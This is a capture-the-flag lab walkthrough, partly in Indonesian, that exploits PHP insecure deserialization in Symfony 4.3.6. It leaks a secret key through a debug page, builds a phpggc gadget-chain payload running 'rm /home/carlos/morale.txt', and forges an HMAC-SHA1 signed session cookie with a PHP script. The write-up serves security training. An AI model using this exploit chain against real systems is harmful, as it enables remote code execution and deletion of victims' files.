# Lab: Exploiting PHP deserialization with a pre-built gadget chain

Challenge Description
 This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

Goal
delete /home/carlos/morale.txt via leak secret key, insecure SHA-1 HMAC hash and vulnerability in Symfony 4.3.6 framework

Solver
login dengan credential yang diberikan dan terlihat jika sessionnya di sign dengan SHA-1 HMAC

```bash
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtejVoM2t5ZTk5NzA5dTR6ZDViY2t1NDl3dWcwYXY0ZiI7fQ==","sig_hmac_sha1":"9bd861ea4b48828749fa581c62631c7212bb1a82"}
```
jika ctrl+u terlihat jika ada directory debug
` <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->`
disitu akan leak secret key yaitu
`SECRET_KEY: xzm7ys17yrpoadbaq39aknnbimpuokj9`

setelah mencoba untuk melihat token
```bash
echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtejVoM2t5ZTk5NzA5dTR6ZDViY2t1NDl3dWcwYXY0ZiI7fQ==" | base64 --decode
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mz5h3kye99709u4zd5bcku49wug0av4f";}
```
saya mencoba untuk menggantinya value access_token dengan 0
untuk memicu error
```bash
 echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==" | base64 --decode
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
```
tapi didapat dari /cgi-bin/phpinfo.php jika versi php nya itu lebih dari 7 berarti tidak akan ada privilege escalaltion 
tapi ini akan memicu error yang akan leak memakai apa framework nya
`Internal Server Error: Symfony Version: 4.3.6`
karena versi Symfony nya rentan, saya menggunakan phpggc untuk generate object nya
```bash
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
PHP Deprecated:  Creation of dynamic property PHPGGC::$options is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 830
PHP Deprecated:  Creation of dynamic property PHPGGC::$parameters is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 831
PHP Deprecated:  Creation of dynamic property PHPGGC\Enhancement\Enhancements::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC/Enhancement/Enhancements.php on line 9
PHP Deprecated:  Creation of dynamic property PHPGGC::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 183

```
setelahnya sign ulang sessionnya dengan script 
```php
<?php
$object = "";

$object = trim($object);

$secretKey = "xzm7ys17yrpoadbaq39aknnbimpuokj9";

$hmac = hash_hmac('sha1', $object, $secretKey);

$data = [
    "token" => $object,
    "sig_hmac_sha1" => $hmac
];

$json = json_encode($data);
$cookie = urlencode($json);

echo $cookie . PHP_EOL;
echo "Raw JSON:\n";
echo $json . "\n\n";

echo "Token length: " . strlen($object) . "\n";
echo "HMAC: " . $hmac . "\n";
?>
```
setelahnya /home/carlos/morale.txt akan terhapus
